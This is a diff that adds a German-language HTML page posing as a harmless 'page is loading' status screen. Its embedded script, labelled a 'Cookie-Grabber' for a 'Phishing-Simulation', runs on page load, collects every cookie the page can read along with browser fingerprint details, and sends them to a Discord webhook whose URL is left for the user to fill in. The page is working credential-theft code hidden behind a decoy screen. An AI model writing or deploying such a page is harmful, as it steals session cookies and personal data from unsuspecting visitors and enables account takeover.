@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Status</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #1a1a2e;
+            color: #fff;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: #16213e;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h1 { color: #0f3460; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Seite wird geladen...</h1>
+        <p>Bitte warten Sie einen Moment.</p>
+    </div>
+
+    <script>
+        // HIER DEINE DISCORD WEBHOOK-URL EINFÜGEN:
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/DEINE_WEBHOOK_ID/DEIN_WEBHOOK_TOKEN";
+
+        // Sammle alle Cookies
+        function getCookies() {
+            if (document.cookie === "") {
+                return "Keine Cookies gefunden";
+            }
+            
+            const cookies = document.cookie.split(";").map(c => c.trim());
+            let cookieObj = {};
+            
+            cookies.forEach(c => {
+                const parts = c.split("=");
+                const name = parts[0];
+                const value = parts.slice(1).join("=");
+                cookieObj[name] = value;
+            });
+            
+            return JSON.stringify(cookieObj, null, 2);
+        }
+
+        // Sammle zusätzliche Browser-Informationen
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                url: window.location.href,
+                referrer: document.referrer || "Kein Referrer"
+            };
+        }
+
+        // Sende an Discord Webhook
+        async function sendToDiscord() {
+            const cookies = getCookies();
+            const browserInfo = getBrowserInfo();
+            
+            const embed = {
+                title: "🔔 Cookie-Grabber - Neue Daten empfangen",
+                color: 0x00ff00, // Grün
+                fields: [
+                    {
+                        name: "🍪 Cookies",
+                        value: "```json\n" + cookies.substring(0, 1024) + "\n```",
+                        inline: false
+                    },
+                    {
+                        name: "🌐 Browser-Info",
+                        value: "```json\n" + JSON.stringify(browserInfo, null, 2).substring(0, 1024) + "\n```",
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: "Cookie-Grabber | Phishing-Simulation"
+                }
+            };
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                if (response.ok) {
+                    console.log("✅ Daten erfolgreich an Discord gesendet");
+                } else {
+                    console.error("❌ Fehler beim Senden:", response.status);
+                }
+            } catch (error) {
+                console.error("❌ Fehler:", error);
+            }
+        }
+
+        // Ausführen nachdem die Seite geladen ist
+        window.addEventListener("load", () => {
+            sendToDiscord();
+        });
+    </script>
+</body>
+</html>
